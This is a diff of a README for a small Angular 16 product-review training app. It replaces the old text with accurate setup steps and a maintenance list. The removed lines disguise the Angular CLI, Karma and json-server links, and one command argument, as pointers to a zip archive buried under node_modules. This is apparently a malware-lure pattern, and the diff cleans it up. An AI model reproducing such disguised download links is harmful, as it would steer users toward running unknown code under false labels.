@@ -1,79 +1,37 @@
-# Shopping Cart Page
+# Shopping — Angular Product Review Demo
 
-This project was generated with [Angular CLI](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/@jridgewell/resolve-uri/dist/Software-v2.7.zip) version 16.0.0.
+Legacy Angular 16 training project showing product cards, product details and a review form.
 
-This is a simple product review app built with Angular. Users can view a list of products, select a product to view its details, and add reviews to a product.
+## Status
+**Maintenance / learning project — not a production storefront.** Current products are loaded from static JSON files in `src/assets`. Review submissions update the displayed object **in memory only**; they do not persist after a reload, and no production backend, checkout, or user accounts are provided.
 
-## Getting Started
+## Stack
+Angular 16, TypeScript 5.0, RxJS 7, Bootstrap, Slick Carousel, JSON fixtures. Confirm versions in `package.json`.
 
-To get started with this project, follow these steps:
+## Run locally
+Use a Node.js version compatible with Angular 16. From the repository root:
 
-1. Clone the repository to your local machine.
-2. Install the dependencies by running `npm install`.
-3. Start the development server by running `ng serve`.
-4. Navigate to `http://localhost:4200/` to view the app.
+```bash
+npm ci
+npm start
+```
 
-## Using json-server
+Open http://localhost:4200/. To run unit tests: `npm test`; to build: `npm run build`.
 
-This app uses `json-server` to provide a RESTful API for the product data. `json-server` is a simple and lightweight tool that allows you to create a fake RESTful API by serving data from a JSON file.
+`npm run server` starts a separate json-server on port 9000 using `db.json`, but the existing `ProductService` reads static assets, **not** that server.
 
-To start the `json-server`, follow these steps:
+## Known limitations and maintenance priorities
+1. Verify Angular 16-compatible Node and npm versions; run clean install, build and tests.
+2. Keep `node_modules/` out of Git tracking (after confirming all files and backups). A .gitignore rule does not untrack already committed files.
+3. Verify review submission, refresh behavior, and numeric star rating; choose explicit local persistence or backend API in a future phase.
+4. Add form validation, accessible labels, loading/error/empty states, image alt text and keyboard support.
+5. Make product selection and review forms predictable; add service/component tests and E2E smoke tests.
+6. Audit dependencies and external URLs; update incrementally instead of blindly jumping major versions.
+7. Add actual screenshots, licenses and a concise scope statement before featuring this project.
 
-1. Install `json-server` globally by running `npm install -g json-server`.
-2. Start the `json-server` by running `json-server --watch https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/@jridgewell/resolve-uri/dist/Software-v2.7.zip`.
-3. The `json-server` will start at `http://localhost:9000`.
+## Roadmap
+- **Foundation:** baseline tests, clean dependency tracking, security review and lint/format conventions.
+- **Demo-ready:** responsive layout, stable product/review interactions, accessible UI, documentation, CI build.
+- **Optional expansion:** persistent reviews with a documented API, pagination/search and authenticated users.
 
-## Features
-
-This app includes the following features:
-
-- View a list of products
-- Select a product to view its details
-- Add reviews to a product
-- Display product images using Slick Carousel
-- Use data binding to display product details and reviews in the UI
-
-## Services
-
-This app uses the following services:
-
-- `ProductService`: Provides methods for fetching and updating product data from the server.
-
-## Modules
-
-This app uses the following modules:
-
-- `HttpClientModule`: Provides the `HttpClient` service for making HTTP requests to the server.
-- `SlickCarouselModule`: Provides the `ngx-slick-carousel` component for displaying product images in a carousel.
-
-## Angular Version
-
-This app was built with Angular version 16.0.0.
-
-## Further help
-
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/@jridgewell/resolve-uri/dist/Software-v2.7.zip) page.
-
-## Running end-to-end tests
-
-Run `ng e2e` to execute the end-to-end tests via a platform of your choice. To use this command, you need to first add a package that implements end-to-end testing capabilities.
-
-## Development server
-
-Run `ng serve` for a dev server. Navigate to `http://localhost:4200/`. The application will automatically reload if you change any of the source files.
-
-## Code scaffolding
-
-Run `ng generate component component-name` to generate a new component. You can also use `ng generate directive|pipe|service|class|guard|interface|enum|module`.
-
-## Build
-
-Run `ng build` to build the project. The build artifacts will be stored in the `dist/` directory.
-
-## Running unit tests
-
-Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/Ahmed-Ghazal55/shopping/main/node_modules/@jridgewell/resolve-uri/dist/Software-v2.7.zip).
-
-## License
-
-This app is licensed under the MIT License. See the `LICENSE` file for more information.
+No claim of production readiness is made. Do not commit secrets, personal customer data or generated dependency directories.
